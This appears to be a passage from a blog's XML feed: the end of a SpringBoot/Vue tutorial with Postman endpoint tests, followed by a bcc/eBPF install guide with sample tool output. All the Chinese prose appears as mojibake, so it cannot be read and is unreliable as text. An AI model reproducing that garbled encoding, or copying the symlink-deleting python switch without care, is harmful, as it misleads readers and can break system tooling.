 <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; <span class="hljs-function">Result&lt;T&gt; <span class="hljs-title">success</span><span class="hljs-params">(T data)</span> </span>&#123;<br>        Result&lt;T&gt; result = <span class="hljs-keyword">new</span> Result&lt;&gt;(data);<br>        result.setCode(<span class="hljs-string">&quot;0&quot;</span>);<br>        result.setMsg(<span class="hljs-string">&quot;æˆåŠŸ&quot;</span>);<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; <span class="hljs-function">Result&lt;T&gt; <span class="hljs-title">success</span><span class="hljs-params">(T data,String msg)</span> </span>&#123;<br>        Result&lt;T&gt; result = <span class="hljs-keyword">new</span> Result&lt;&gt;(data);<br>        result.setCode(<span class="hljs-string">&quot;0&quot;</span>);<br>        result.setMsg(msg);<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Result <span class="hljs-title">error</span><span class="hljs-params">(String code, String msg)</span> </span>&#123;<br>        Result result = <span class="hljs-keyword">new</span> Result();<br>        result.setCode(code);<br>        result.setMsg(msg);<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h2 id="äº”-postmanæµ‹è¯•"><a class="markdownIt-Anchor" href="#äº”-postmanæµ‹è¯•"></a> äº”ã€postmanæµ‹è¯•</h2><p>ä¹‹åæˆ‘ä»¬å¯ä»¥åœ¨postmanä¸­æµ‹è¯•æˆ‘ä»¬å®ç°çš„æ¥å£</p><p>å½“ç„¶ï¼Œåœ¨å®é™…ä¸­æˆ‘å¹¶æ²¡æœ‰ç›´æ¥ä¸€æ¬¡æ€§ç›´æ¥å°†ä¸€æ•´ä¸ªé¡¹ç›®æ­å¥½ï¼Œè€Œæ˜¯ä»ä¸€ä¸ªæ¥å£å¼€å§‹ï¼Œæ¯”å¦‚å…ˆå°†person/addè¿™ä¸ªæ¥å£è°ƒé€šï¼Œé‚£å°±åªè¦é€çº§å®ç°personæœ‰å…³çš„æ–‡ä»¶å°±å¥½äº†ï¼Œå…ˆè‡ªåº•å‘ä¸Šè°ƒé€šä¸€ä¸ªæ¥å£ï¼Œè¿™æ ·æ•´ä¸ªé¡¹ç›®çš„æ¡†æ¶å°±æœ‰äº†ï¼Œé‚£ä¹‹åçš„æ¥å£å®ç°ä¸è¿‡æ˜¯é‡å¤é€ è½®å­ç½¢äº†ã€‚</p><h3 id="personaddæµ‹è¯•"><a class="markdownIt-Anchor" href="#personaddæµ‹è¯•"></a> /person/addæµ‹è¯•</h3><p>å¯¹äºåœ¨æ§åˆ¶å™¨ä¸­ç”¨<code>@RequestBody</code>æ³¨è§£æ³¨å…¥çš„å‚æ•°ï¼Œæˆ‘ä»¬é€‰æ‹©row,ç„¶åç”¨jsonæ ¼å¼è¾“å…¥æ•°æ®ï¼ŒæˆåŠŸåå¯ä»¥çœ‹åˆ°åé¦ˆ</p><p><img src="/posts/c43b2e6b/image-20220418133245835.png" alt="image-20220418133245835"></p><p><img src="/posts/c43b2e6b/image-20220418133126294.png" alt="image-20220418133126294"></p><h3 id="personlistæµ‹è¯•"><a class="markdownIt-Anchor" href="#personlistæµ‹è¯•"></a> /person/listæµ‹è¯•</h3><p><img src="/posts/c43b2e6b/image-20220418133515503.png" alt="image-20220418133515503"></p><h3 id="userdeleteæµ‹è¯•"><a class="markdownIt-Anchor" href="#userdeleteæµ‹è¯•"></a> /user/deleteæµ‹è¯•</h3><p>å¯¹äºç”¨@RequestParamæ³¨è§£ç»™å®šçš„å‚æ•°ï¼Œæˆ‘ä»¬é‡‡ç”¨paramså½¢å¼æ¥å¡«å†™å‚æ•°</p><p><img src="/posts/c43b2e6b/image-20220418133556100.png" alt="image-20220418133556100"></p><p><img src="/posts/c43b2e6b/image-20220418133538946.png" alt="image-20220418133538946"></p><h3 id="userlistæµ‹è¯•"><a class="markdownIt-Anchor" href="#userlistæµ‹è¯•"></a> /user/listæµ‹è¯•</h3><p><img src="/posts/c43b2e6b/image-20220418133702228.png" alt="image-20220418133702228"></p><p>åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬è¿™ä¸ªåç«¯é¡¹ç›®çš„æ‰€æœ‰çš„æ¥å£éƒ½å®Œæˆäº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯åœ¨å‰ç«¯è°ƒç”¨è¿™äº›æ¥å£æ¥å®ç°ä¸€ä¸ªç›´è§‚çš„é¡µé¢äº†ã€‚</p><p>å‰ç«¯é¡¹ç›®é¢„è§ˆï¼š</p><p><img src="/posts/c43b2e6b/image-20220418133834884.png" alt="image-20220418133834884"></p><p><img src="/posts/c43b2e6b/image-20220418133858620.png" alt="image-20220418133858620"></p><p>å‚è€ƒï¼š</p><p>ä¸»è¦å‚è€ƒäº†ä¸‹é¢çš„ç¬¬ä¸€ç¯‡æ–‡ç« å­¦ä¹ äº†SpringBootçš„åŸºæœ¬æ¶æ„ï¼Œå¹¶ä»¥æ­¤ä¸ºåŸºç¡€å®ç°äº†è‡ªå·±çš„é¡¹ç›®éœ€æ±‚</p><p><a href="https://www.makerhu.com/posts/5b2ca0db/">å¿«é€Ÿä¸Šæ‰‹SpringBooté¡¹ç›®ï¼ˆç™»å½•æ³¨å†Œä¿å§†çº§æ•™ç¨‹ï¼‰</a></p><p>ç”¨ä¸‹é¢çš„æ–‡ç« å­¦ä¹ äº†Springçš„åŸºæœ¬çŸ¥è¯†</p><p><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1266263217140032">Springå¼€å‘- å»–é›ªå³°çš„å®˜æ–¹ç½‘ç«™</a></p><p><a href="https://spring.io/">Spring | Home</a></p>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SpringBoot</tag>
      
      <tag>vue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bccå®‰è£…åŠåŸºæœ¬ä½¿ç”¨æ•™ç¨‹</title>
    <link href="/posts/ae72ca8e/"/>
    <url>/posts/ae72ca8e/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-bccä»‹ç»"><a class="markdownIt-Anchor" href="#0x00-bccä»‹ç»"></a> 0x00 bccä»‹ç»</h2><p>BCC æ˜¯ä¸€ä¸ªåŸºäºebpfçš„ç”¨äºåˆ›å»ºé«˜æ•ˆå†…æ ¸è·Ÿè¸ªå’Œæ“ä½œç¨‹åºçš„å·¥å…·åŒ…ï¼ŒåŒ…æ‹¬å‡ ä¸ªæœ‰ç”¨çš„å·¥å…·å’Œç¤ºä¾‹ã€‚</p><h2 id="0x01-åŸºäºæºç æ„å»ºbcc"><a class="markdownIt-Anchor" href="#0x01-åŸºäºæºç æ„å»ºbcc"></a> 0x01 åŸºäºæºç æ„å»ºbcc</h2><p>å‚è€ƒå®˜æ–¹<a href="https://github.com/iovisor/bcc/blob/master/INSTALL.md">install.md</a></p><h3 id="å®‰è£…æ„å»ºä¾èµ–é¡¹"><a class="markdownIt-Anchor" href="#å®‰è£…æ„å»ºä¾èµ–é¡¹"></a> å®‰è£…æ„å»ºä¾èµ–é¡¹</h3><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"> <span class="hljs-comment"># Trusty (14.04 LTS) and older</span><br>VER=trusty<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb http://llvm.org/apt/<span class="hljs-variable">$VER</span>/ llvm-toolchain-<span class="hljs-variable">$VER</span>-3.7 main</span><br><span class="hljs-string">deb-src http://llvm.org/apt/<span class="hljs-variable">$VER</span>/ llvm-toolchain-<span class="hljs-variable">$VER</span>-3.7 main&quot;</span> | \<br>  sudo <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/llvm.list<br><span class="hljs-built_in">wget</span> <span class="hljs-literal">-O</span> - http://llvm.org/apt/llvm<span class="hljs-literal">-snapshot</span>.gpg.key | sudo apt<span class="hljs-literal">-key</span> add -<br>sudo apt<span class="hljs-literal">-get</span> update<br><br><span class="hljs-comment"># For Bionic (18.04 LTS)</span><br>sudo apt<span class="hljs-literal">-get</span> <span class="hljs-literal">-y</span> install bison <span class="hljs-built_in">build-essential</span> cmake flex git lib<span class="hljs-built_in">edit-dev</span> \<br>  libllvm6.<span class="hljs-number">0</span> llvm<span class="hljs-literal">-6</span>.<span class="hljs-number">0</span><span class="hljs-literal">-dev</span> libclang<span class="hljs-literal">-6</span>.<span class="hljs-number">0</span><span class="hljs-literal">-dev</span> python zlib1g<span class="hljs-literal">-dev</span> libelf<span class="hljs-literal">-dev</span> libfl<span class="hljs-literal">-dev</span> python3<span class="hljs-literal">-distutils</span><br><br><span class="hljs-comment"># For Eoan (19.10) or Focal (20.04.1 LTS)</span><br>sudo apt install <span class="hljs-literal">-y</span> bison <span class="hljs-built_in">build-essential</span> cmake flex git lib<span class="hljs-built_in">edit-dev</span> \<br>  libllvm7 llvm<span class="hljs-literal">-7</span><span class="hljs-literal">-dev</span> libclang<span class="hljs-literal">-7</span><span class="hljs-literal">-dev</span> python zlib1g<span class="hljs-literal">-dev</span> libelf<span class="hljs-literal">-dev</span> libfl<span class="hljs-literal">-dev</span> python3<span class="hljs-literal">-distutils</span><br>  <br><span class="hljs-comment"># For Hirsute (21.04)  or Impish (21.10)</span><br>sudo apt install <span class="hljs-literal">-y</span> bison <span class="hljs-built_in">build-essential</span> cmake flex git lib<span class="hljs-built_in">edit-dev</span>   libllvm11 llvm<span class="hljs-literal">-11</span><span class="hljs-literal">-dev</span> libclang<span class="hljs-literal">-11</span><span class="hljs-literal">-dev</span> python zlib1g<span class="hljs-literal">-dev</span> libelf<span class="hljs-literal">-dev</span> libfl<span class="hljs-literal">-dev</span> python3<span class="hljs-literal">-distutils</span><br><br><span class="hljs-comment"># For other versions</span><br>sudo apt<span class="hljs-literal">-get</span> <span class="hljs-literal">-y</span> install bison <span class="hljs-built_in">build-essential</span> cmake flex git lib<span class="hljs-built_in">edit-dev</span> \<br>  libllvm3.<span class="hljs-number">7</span> llvm<span class="hljs-literal">-3</span>.<span class="hljs-number">7</span><span class="hljs-literal">-dev</span> libclang<span class="hljs-literal">-3</span>.<span class="hljs-number">7</span><span class="hljs-literal">-dev</span> python zlib1g<span class="hljs-literal">-dev</span> libelf<span class="hljs-literal">-dev</span> python3<span class="hljs-literal">-distutils</span><br><br><span class="hljs-comment"># For Lua support</span><br>sudo apt<span class="hljs-literal">-get</span> <span class="hljs-literal">-y</span> install luajit luajit<span class="hljs-literal">-5</span>.<span class="hljs-number">1</span><span class="hljs-literal">-dev</span><br></code></pre></div></td></tr></table></figure><blockquote><p><strong>é—®é¢˜1</strong></p><p>ä½†æ˜¯ç›®å‰llvm-7ä¼¼ä¹ä¸å†è¢«æ”¯æŒ,é‡‡ç”¨llvm-7ä¼šä¸€ç›´æŠ¥é”™ï¼Œè¿™ä¸ªé—®é¢˜å¡äº†æˆ‘å¾ˆä¹…</p><p>åæ¥é‡‡ç”¨çš„æ˜¯llvm-11ï¼Œå³é‡‡ç”¨21.04å¯¹åº”çš„ä¾èµ–ï¼Œè¿™æ ·çš„è¯å¯ä»¥æˆåŠŸã€‚</p><figure class="highlight q"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs q">sudo apt install -y bison build-essential cmake flex git libedit-<span class="hljs-built_in">dev</span>   libllvm11 llvm<span class="hljs-number">-11</span>-<span class="hljs-built_in">dev</span> libclang<span class="hljs-number">-11</span>-<span class="hljs-built_in">dev</span> python zlib1g-<span class="hljs-built_in">dev</span> libelf-<span class="hljs-built_in">dev</span> libfl-<span class="hljs-built_in">dev</span> python3-distutils<br></code></pre></div></td></tr></table></figure></blockquote><h3 id="å®‰è£…å’Œç¼–è¯‘bcc"><a class="markdownIt-Anchor" href="#å®‰è£…å’Œç¼–è¯‘bcc"></a> å®‰è£…å’Œç¼–è¯‘BCC</h3><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"> git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/iovisor/</span>bcc.git<br>mkdir bcc<span class="hljs-regexp">/build; cd bcc/</span>build<br>cmake ..<br>make -j `nproc` <span class="hljs-comment">#</span><br>sudo make install<br>cmake -DPYTHON_CMD=python3 .. <span class="hljs-comment"># build python3 binding</span><br>pushd src<span class="hljs-regexp">/python/</span><br>make<br>sudo make install<br>popd<br></code></pre></div></td></tr></table></figure><blockquote><p><strong>é—®é¢˜2</strong></p><p><img src="/posts/ae72ca8e/image-20220227193538882.png" alt="image-20220227193538882"></p><p>å…¨éƒ¨å®‰è£…å®Œæˆåæµ‹è¯•å¯èƒ½ä¼šé‡åˆ°å¦‚å›¾æ‰€ç¤ºçš„æŠ¥é”™ï¼ŒåŸå› æ˜¯é»˜è®¤pythonç¯å¢ƒä¸ºpython,è€Œæˆ‘ä»¬çš„bccè¢«å®‰è£…åœ¨python3ä¸‹</p><p><img src="/posts/ae72ca8e/image-20220227193743842.png" alt="image-20220227193743842"></p><p>æˆ‘ä»¬åœ¨python3ä¸‹è¿è¡Œå³å¯æˆåŠŸè¿è¡Œï¼Œè¦è®°å¾—åŠ sudoæƒé™</p><p>ä¹Ÿå¯ä»¥åˆ‡æ¢é»˜è®¤python</p><p>å…ˆåˆ é™¤é»˜è®¤çš„Pythonè½¯é“¾æ¥ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">sudo rm <span class="hljs-regexp">/usr/</span>bin/python<br></code></pre></div></td></tr></table></figure><p>ç„¶ååˆ›å»ºä¸€ä¸ªæ–°çš„è½¯é“¾æ¥æŒ‡å‘éœ€è¦çš„Pythonç‰ˆæœ¬ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">sudo ln -s <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/python3.5 /u</span>sr<span class="hljs-regexp">/bin/</span>python<br></code></pre></div></td></tr></table></figure><p><img src="/posts/ae72ca8e/image-20220227193841252.png" alt="image-20220227193841252"></p></blockquote><h2 id="0x02-bccéƒ¨åˆ†å·¥å…·å®ä¾‹"><a class="markdownIt-Anchor" href="#0x02-bccéƒ¨åˆ†å·¥å…·å®ä¾‹"></a> 0x02 bccéƒ¨åˆ†å·¥å…·å®ä¾‹</h2><p>å‚è€ƒ<a href="https://github.com/iovisor/bcc/blob/master/docs/tutorial.md">tutorial.md</a></p><h3 id="before-bcc"><a class="markdownIt-Anchor" href="#before-bcc"></a> before bcc</h3><p>ä»ä¸€ç¯‡linuxåŸºç¡€æ€§èƒ½åˆ†æçš„æ–‡ç« å¼€å§‹<a href="https://netflixtechblog.com/linux-performance-analysis-in-60-000-milliseconds-accc10403c55">Linux Performance Analysis in 60,000 Milliseconds</a></p><p>è¿™ç¯‡æ–‡ç« è®²è¿°äº†ä¸‹é¢çš„å‘½ä»¤</p><ol><li>uptime</li><li>dmesg | tail</li><li>vmstat 1</li><li>mpstat -P ALL 1</li><li>pidstat 1</li><li>iostat -xz 1</li><li>free -m</li><li>sar -n DEV 1</li><li>sar -n TCP,ETCP 1</li><li>top</li></ol><h3 id="11-execsnoop"><a class="markdownIt-Anchor" href="#11-execsnoop"></a> 1.1 execsnoop</h3><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-comment"># ./execsnoop</span><br><span class="hljs-attribute">PCOMM</span>            PID    RET ARGS<br><span class="hljs-attribute">supervise</span>        <span class="hljs-number">9660</span>     <span class="hljs-number">0</span> ./run<br><span class="hljs-attribute">supervise</span>        <span class="hljs-number">9661</span>     <span class="hljs-number">0</span> ./run<br><span class="hljs-attribute">mkdir</span>            <span class="hljs-number">9662</span>     <span class="hljs-number">0</span> /bin/mkdir -p ./main<br><span class="hljs-attribute">run</span>              <span class="hljs-number">9663</span>     <span class="hljs-number">0</span> ./run<span class="hljs-meta"></span><br><span class="hljs-meta">[...]</span><br></code></pre></div></td></tr></table></figure><p>execsnoop ä¸ºæ¯ä¸ªæ–°è¿›ç¨‹æ‰“å°ä¸€è¡Œè¾“å‡ºã€‚æ£€æŸ¥çŸ­æš‚çš„è¿›ç¨‹ã€‚è¿™äº›å¯èƒ½ä¼šæ¶ˆè€— CPU èµ„æºï¼Œä½†ä¸ä¼šå‡ºç°åœ¨å¤§å¤šæ•°å®šæœŸæ‹æ‘„æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹å¿«ç…§çš„ç›‘æ§å·¥å…·ä¸­ã€‚</p><p>å®ƒé€šè¿‡è·Ÿè¸ª exec() è€Œä¸æ˜¯ fork() å·¥ä½œï¼Œå› æ­¤å®ƒå°†æ•è·è®¸å¤šç±»å‹çš„æ–°è¿›ç¨‹ï¼Œä½†ä¸æ˜¯å…¨éƒ¨ï¼ˆä¾‹å¦‚ï¼Œå®ƒä¸ä¼šçœ‹åˆ°åº”ç”¨ç¨‹åºå¯åŠ¨å·¥ä½œè¿›ç¨‹ï¼Œä¸ä¼š exec() å…¶ä»–ä»»ä½•ä¸œè¥¿ï¼‰ .</p><h3 id="12-opensnoop"><a class="markdownIt-Anchor" href="#12-opensnoop"></a> 1.2. opensnoop</h3><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-comment"># ./opensnoop</span><br>PID    COMM               FD ERR PATH<br><span class="hljs-number">1565</span>   redis-server        <span class="hljs-number">5</span>   <span class="hljs-number">0</span> <span class="hljs-regexp">/proc/</span><span class="hljs-number">1565</span>/stat<br><span class="hljs-number">1565</span>   redis-server        <span class="hljs-number">5</span>   <span class="hljs-number">0</span> <span class="hljs-regexp">/proc/</span><span class="hljs-number">1565</span>/stat<br><span class="hljs-number">1565</span>   redis-server        <span class="hljs-number">5</span>   <span class="hljs-number">0</span> <span class="hljs-regexp">/proc/</span><span class="hljs-number">1565</span>/stat<br><span class="hljs-number">1603</span>   snmpd               <span class="hljs-number">9</span>   <span class="hljs-number">0</span> <span class="hljs-regexp">/proc/</span>net/dev<br><span class="hljs-number">1603</span>   snmpd              <span class="hljs-number">11</span>   <span class="hljs-number">0</span> <span class="hljs-regexp">/proc/</span>net/if_inet6<br><span class="hljs-number">1603</span>   snmpd              -<span class="hljs-number">1</span>   <span class="hljs-number">2</span> <span class="hljs-regexp">/sys/</span>class<span class="hljs-regexp">/net/</span>eth0<span class="hljs-regexp">/device/</span>vendor<br><span class="hljs-number">1603</span>   snmpd              <span class="hljs-number">11</span>   <span class="hljs-number">0</span> <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/net/i</span>pv4<span class="hljs-regexp">/neigh/</span>eth0/retrans_time_ms<br><span class="hljs-number">1603</span>   snmpd              <span class="hljs-number">11</span>   <span class="hljs-number">0</span> <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/net/i</span>pv6<span class="hljs-regexp">/neigh/</span>eth0/retrans_time_ms<br><span class="hljs-number">1603</span>   snmpd              <span class="hljs-number">11</span>   <span class="hljs-number">0</span> <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/net/i</span>pv6<span class="hljs-regexp">/conf/</span>eth0/forwarding<br>[...]<br></code></pre></div></td></tr></table></figure><p>opensnoop ä¸ºæ¯ä¸ª open() ç³»ç»Ÿè°ƒç”¨æ‰“å°ä¸€è¡Œè¾“å‡ºï¼ŒåŒ…æ‹¬è¯¦ç»†ä¿¡æ¯ã€‚</p><p>æ‰“å¼€çš„æ–‡ä»¶å¯ä»¥å‘Šè¯‰æ‚¨å¾ˆå¤šå…³äºåº”ç”¨ç¨‹åºå¦‚ä½•å·¥ä½œçš„ä¿¡æ¯ï¼šè¯†åˆ«å®ƒä»¬çš„æ•°æ®æ–‡ä»¶ã€é…ç½®æ–‡ä»¶å’Œæ—¥å¿—æ–‡ä»¶ã€‚æœ‰æ—¶ï¼Œå½“åº”ç”¨ç¨‹åºä¸æ–­å°è¯•è¯»å–ä¸å­˜åœ¨çš„æ–‡ä»¶æ—¶ï¼Œå®ƒä»¬å¯èƒ½ä¼šå‡ºç°å¼‚å¸¸è¡Œä¸ºå¹¶ä¸”æ€§èƒ½ä¸ä½³ã€‚opensnoop è®©æ‚¨å¿«é€Ÿæµè§ˆã€‚</p><h3 id="13-ext4slower-or-btrfs-xfs-zfs"><a class="markdownIt-Anchor" href="#13-ext4slower-or-btrfs-xfs-zfs"></a> 1.3. ext4slower (or btrfs*, xfs*, zfs*)</h3><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-comment"># ./ext4slower</span><br><span class="hljs-attribute">Tracing</span> ext<span class="hljs-number">4</span> operations slower than <span class="hljs-number">10</span> ms<br><span class="hljs-attribute">TIME</span>     COMM           PID    T BYTES   OFF_KB   LAT(ms) FILENAME<br><span class="hljs-attribute">06</span>:<span class="hljs-number">35</span>:<span class="hljs-number">01</span> cron           <span class="hljs-number">16464</span>  R <span class="hljs-number">1249</span>    <span class="hljs-number">0</span>          <span class="hljs-number">16</span>.<span class="hljs-number">05</span> common-auth<br><span class="hljs-attribute">06</span>:<span class="hljs-number">35</span>:<span class="hljs-number">01</span> cron           <span class="hljs-number">16463</span>  R <span class="hljs-number">1249</span>    <span class="hljs-number">0</span>          <span class="hljs-number">16</span>.<span class="hljs-number">04</span> common-auth<br><span class="hljs-attribute">06</span>:<span class="hljs-number">35</span>:<span class="hljs-number">01</span> cron           <span class="hljs-number">16465</span>  R <span class="hljs-number">1249</span>    <span class="hljs-number">0</span>          <span class="hljs-number">16</span>.<span class="hljs-number">03</span> common-auth<br><span class="hljs-attribute">06</span>:<span class="hljs-number">35</span>:<span class="hljs-number">01</span> cron           <span class="hljs-number">16465</span>  R <span class="hljs-number">4096</span>    <span class="hljs-number">0</span>          <span class="hljs-number">10</span>.<span class="hljs-number">62</span> login.defs<br><span class="hljs-attribute">06</span>:<span class="hljs-number">35</span>:<span class="hljs-number">01</span> cron           <span class="hljs-number">16464</span>  R <span class="hljs-number">4096</span>    <span class="hljs-number">0</span>          <span class="hljs-number">10</span>.<span class="hljs-number">61</span> login.defs<br></code></pre></div></td></tr></table></figure><p>ext4slower è·Ÿè¸ª ext4 æ–‡ä»¶ç³»ç»Ÿå¹¶è®¡ç®—å¸¸è§æ“ä½œï¼Œç„¶åä»…æ‰“å°è¶…è¿‡é˜ˆå€¼çš„æ“ä½œã€‚</p><p>è¿™å¯¹äºè¯†åˆ«æˆ–å…é™¤ä¸€ç§æ€§èƒ½é—®é¢˜éå¸¸æœ‰ç”¨ï¼šé€šè¿‡æ–‡ä»¶ç³»ç»Ÿå•ç‹¬æ˜¾ç¤ºæ…¢é€Ÿç£ç›˜ i/Oã€‚ç£ç›˜å¼‚æ­¥å¤„ç† I/Oï¼Œå¹¶ä¸”å¾ˆéš¾å°†è¯¥å±‚çš„å»¶è¿Ÿä¸å»¶è¿Ÿåº”ç”¨ç¨‹åºä½“éªŒç›¸å…³è”ã€‚åœ¨å†…æ ¸å †æ ˆä¸­å‘ä¸Šè·Ÿè¸ªï¼Œåœ¨ VFS -&gt; æ–‡ä»¶ç³»ç»Ÿæ¥å£å¤„ï¼Œå°†æ›´æ¥è¿‘åœ°åŒ¹é…åº”ç”¨ç¨‹åºæ‰€é­å—çš„ã€‚ä½¿ç”¨æ­¤å·¥å…·æ¥ç¡®å®šæ–‡ä»¶ç³»ç»Ÿå»¶è¿Ÿæ˜¯å¦è¶…è¿‡ç»™å®šé˜ˆå€¼ã€‚</p><p>bcc ä¸­å­˜åœ¨ç”¨äºå…¶ä»–æ–‡ä»¶ç³»ç»Ÿçš„ç±»ä¼¼å·¥å…·ï¼šbtrfsslowerã€xfsslower å’Œ zfsslowerã€‚è¿˜æœ‰fileslowerï¼Œå®ƒåœ¨VFSå±‚å·¥ä½œå¹¶è·Ÿè¸ªæ‰€æœ‰å†…å®¹ï¼ˆå°½ç®¡å¼€é”€æ›´é«˜ï¼‰ã€‚</p><h3 id="14-biolatency"><a class="markdownIt-Anchor" href="#14-biolatency"></a> 1.4. biolatency</h3><figure class="highlight tap"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs tap"><span class="hljs-comment"># ./biolatency</span><br>Tracing block device I/O... Hit Ctrl-C to end.<br>^C<br>     usecs           : count     distribution<br>      <span class="hljs-number"> 0 </span>-&gt;<span class="hljs-number"> 1 </span>       :<span class="hljs-number"> 0 </span>       |                                      |<br>      <span class="hljs-number"> 2 </span>-&gt;<span class="hljs-number"> 3 </span>       :<span class="hljs-number"> 0 </span>       |                                      |<br>      <span class="hljs-number"> 4 </span>-&gt;<span class="hljs-number"> 7 </span>       :<span class="hljs-number"> 0 </span>       |                                      |<br>      <span class="hljs-number"> 8 </span>-&gt;<span class="hljs-number"> 15 </span>      :<span class="hljs-number"> 0 </span>       |                                      |<br>     <span class="hljs-number"> 16 </span>-&gt;<span class="hljs-number"> 31 </span>      :<span class="hljs-number"> 0 </span>       |                                      |<br>     <span class="hljs-number"> 32 </span>-&gt;<span class="hljs-number"> 63 </span>      :<span class="hljs-number"> 0 </span>       |                                      |<br>     <span class="hljs-number"> 64 </span>-&gt;<span class="hljs-number"> 127 </span>     :<span class="hljs-number"> 1 </span>       |                                      |<br>    <span class="hljs-number"> 128 </span>-&gt;<span class="hljs-number"> 255 </span>     :<span class="hljs-number"> 12 </span>      |********                              |<br>    <span class="hljs-number"> 256 </span>-&gt;<span class="hljs-number"> 511 </span>     :<span class="hljs-number"> 15 </span>      |**********                            |<br>    <span class="hljs-number"> 512 </span>-&gt;<span class="hljs-number"> 1023 </span>    :<span class="hljs-number"> 43 </span>      |*******************************       |<br>   <span class="hljs-number"> 1024 </span>-&gt;<span class="hljs-number"> 2047 </span>    :<span class="hljs-number"> 52 </span>      |**************************************|<br>   <span class="hljs-number"> 2048 </span>-&gt;<span class="hljs-number"> 4095 </span>    :<span class="hljs-number"> 47 </span>      |**********************************    |<br>   <span class="hljs-number"> 4096 </span>-&gt;<span class="hljs-number"> 8191 </span>    :<span class="hljs-number"> 52 </span>      |**************************************|<br>   <span class="hljs-number"> 8192 </span>-&gt;<span class="hljs-number"> 16383 </span>   :<span class="hljs-number"> 36 </span>      |**************************            |<br>  <span class="hljs-number"> 16384 </span>-&gt;<span class="hljs-number"> 32767 </span>   :<span class="hljs-number"> 15 </span>      |**********                            |<br>  <span class="hljs-number"> 32768 </span>-&gt;<span class="hljs-number"> 65535 </span>   :<span class="hljs-number"> 2 </span>       |*                                     |<br>  <span class="hljs-number"> 65536 </span>-&gt;<span class="hljs-number"> 131071 </span>  :<span class="hljs-number"> 2 </span>       |*                                     |<br></code></pre></div></td></tr></table></figure><p>biolatency è·Ÿè¸ªç£ç›˜ I/O 